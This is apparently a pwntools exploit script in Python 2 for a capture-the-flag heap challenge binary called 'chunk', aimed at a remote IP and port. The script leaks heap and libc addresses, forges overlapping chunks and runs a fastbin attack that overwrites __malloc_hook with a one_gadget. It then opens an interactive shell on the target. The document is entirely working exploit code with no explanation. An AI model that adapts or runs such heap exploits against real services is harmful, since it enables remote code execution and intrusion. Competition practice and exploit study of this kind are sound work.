from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
file = './chunk'
e = ELF(file)
libc = e.libc
ip = '183.129.189.60'
port = '10014'
local = 0


def dbg(code=""):
    if local == 0:
        return
    gdb.attach(p, code)


def run():
    global p
    if local == 1:
        p = process(file)
    else:
        p = remote(ip, port)


se = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sea = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
rc = lambda: p.recv(timeout=0.5)
ru = lambda x: p.recvuntil(x, drop=True)
rn = lambda x: p.recv(x)
shell = lambda: p.interactive()
un64 = lambda x: u64(x.ljust(8, '\x00'))
un32 = lambda x: u32(x.ljust(4, '\x00'))

run()


def add(i, l):
    sla(': ', '1')
    sla(': ', str(i))
    sla(': ', str(l))


def show(i):
    sla(': ', '2')
    sla('?', str(i))


def delete(i):
    sla(': ', '3')
    sla('?', str(i))


def edit(i, c):
    sla(': ', '4')
    sla('?', str(i))
    sea(': ', c)


add(1, 0x99)
add(2, 0x68)
add(3, 0x68)
add(4, 0xf8)
add(5, 0x20)
delete(2)
delete(3)
add(2, 0x68)
show(2)
ru(': ')
heap_base = un64(rn(6)) - 0xb0
delete(1)
add(1, 0x78)
show(1)
ru(': ')
libc.address = un64(rn(6)) - 0x3c4c18
print hex(heap_base)
print hex(libc.address)
add(3, 0x68)
edit(2, p64(1) * 12 + p64(0xd0) + '\n')
edit(3, p64(0) + p64(0xd1) + p64(heap_base + 0xc0) * 2 + '\n')
# dbg('breakrva 0xdc5')
delete(4)
delete(2)

add(4, 0xa0)
edit(4, p64(0) * 11 + p64(0x71) + p64(libc.address + 0x3c4aed) + '\n')

add(6, 0x68)
add(7, 0x68)

gagdet = libc.address + 0xf1147

edit(7, 'a' * 0xb + p64(gagdet) + p64(libc.address + 0x846C2) + '\n')
dbg('b*' + hex(gagdet))
add(9, 9)

shell()